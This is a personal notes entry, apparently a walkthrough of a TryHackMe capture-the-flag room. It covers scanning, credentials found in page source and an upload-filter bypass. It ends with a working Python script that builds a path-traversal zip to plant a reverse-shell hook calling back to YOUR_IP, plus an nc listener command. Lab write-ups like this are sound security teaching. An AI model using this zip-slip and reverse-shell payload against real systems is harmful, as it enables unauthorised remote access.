---
created: 2026-09-22
tags:
  - note
  - journal
  - cyberStuff
title: The Hollow Shell
draft: false
date:
subiect:
dificultate: 1
amuca: false
link:
lastmod: 2026-10-09T12:32:05.825Z
---
THM free room.

ncat first scan:\
![](/images/static/Pasted%20image%2020260922052203.png)\
Weird service upnp; let's run a larger scan and research the service in the meantime:\
![](/images/static/Pasted%20image%2020260922052430.png)\
OK, so it's some sort of configuration protocol for larger networks:\
![](/images/static/Pasted%20image%2020260922052536.png)\
On the larger scan, we found that there is an HTTP server on port 5000. Let's look this up:\
![](/images/static/Pasted%20image%2020260922052611.png)\
And we have a login page here, cool:\
![](/images/static/Pasted%20image%2020260922054350.png)\
Found this in the source code; log in with those creds:\
![](/images/static/Pasted%20image%2020260922054446.png)\
Looks like basic file upload/injection.\
We have to match a certain file type to upload a file; we will need to try some different approaches to bypass this. Let's create a zip from scratch like this:\
![](/images/static/Pasted%20image%2020260922062933.png)\
Then add a name (we will need this later):\
![](/images/static/Pasted%20image%2020260922063025.png)\
Now zip it up:\
![](/images/static/Pasted%20image%2020260922063039.png)\
Let's try this one:\
![](/images/static/Pasted%20image%2020260922063251.png)\
And we need to modify it:\
![](/images/static/Pasted%20image%2020260922063344.png)\
Just add square brackets for photo.png:\
![](/images/static/Pasted%20image%2020260922063435.png)\
Upload it and we get this address, but this is of no use for us. We need to configure some kind of payload that would give us RCE on the machine.

Based on the "automation hooks" line under the upload button, we can deduce that there exists a folder /var/www/hooks where we can run Python scripts, so we can craft a script for that:

```python


import zipfile
import json

payload = ('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",YOUR_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")')

with zipfile.ZipFile("something.zip","w") as z :
        z.writestr("shell.json", json.dumps({"name": "evil", "assets": ["photo.png"]}))
        z.writestr("photo.png", b"\x89PNG\r\n\x1a\n")
        z.writestr("../../hooks/something.py", payload)


```

This script will create an archive named something.zip that, when uploaded, will send a reverse shell back to you.\
Just start a listener with:

```bash
nc -lnvp YOUR_PORT
```

Then upload the file.

You will be connected to the machine after that; the flag is inside the room service home directory.
